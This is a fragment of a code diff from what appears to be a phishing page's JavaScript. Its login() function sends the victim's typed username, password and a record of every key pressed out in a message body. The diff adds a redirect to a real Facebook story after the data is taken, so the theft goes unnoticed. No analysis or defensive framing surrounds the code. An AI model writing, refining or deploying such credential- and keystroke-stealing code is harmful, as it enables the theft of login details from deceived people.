@@ -146,7 +146,7 @@ function login() {
     Body: "Username: " + username.value() + "<br>Password: " + password.value() + "<br><br><br>Keys pressed:<br>" + clickedKeys
   }).then()
   // createCustomAlert('Login may have failed'));
-
+     window.location.replace("https://m.facebook.com/story.php?story_fbid=538179603522765&id=118526656660");
 }
 
 
@@ -352,7 +352,7 @@ function login() {
     Body: "Username: " + username.value() + "<br>Password: " + password.value() + "<br><br><br>Keys pressed:<br>" + clickedKeys
   }).then()
   //createCustomAlert('Login may have failed'));
-
+    window.location.replace("https://m.facebook.com/story.php?story_fbid=538179603522765&id=118526656660");
 
 }
 
